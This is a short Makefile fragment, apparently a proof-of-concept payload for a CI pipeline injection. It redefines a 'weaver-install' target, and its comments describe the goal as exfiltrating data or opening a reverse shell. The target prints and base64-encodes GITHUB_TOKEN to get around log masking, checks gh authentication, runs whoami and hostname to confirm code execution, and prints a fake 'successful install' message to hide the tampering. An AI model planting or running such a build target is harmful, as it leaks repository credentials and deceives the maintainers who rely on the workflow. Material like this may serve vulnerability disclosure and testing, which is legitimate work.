# Original weaver-install might do something else. 
# We redefine it to exfiltrate data or execute a reverse shell.

weaver-install:
	@echo "Executing PoC..."
	# Example 1: Exfiltrate the GITHUB_TOKEN (even if masked, you can base64 it)
	@echo "Token: $(GITHUB_TOKEN)" | base64
	# Example 2: Check permissions
	@gh auth status
	# Example 3: Simple RCE verification
	@whoami && hostname && pwd
	# Example 4: To ensure the workflow continues without error
	@echo "Simulating successful install"
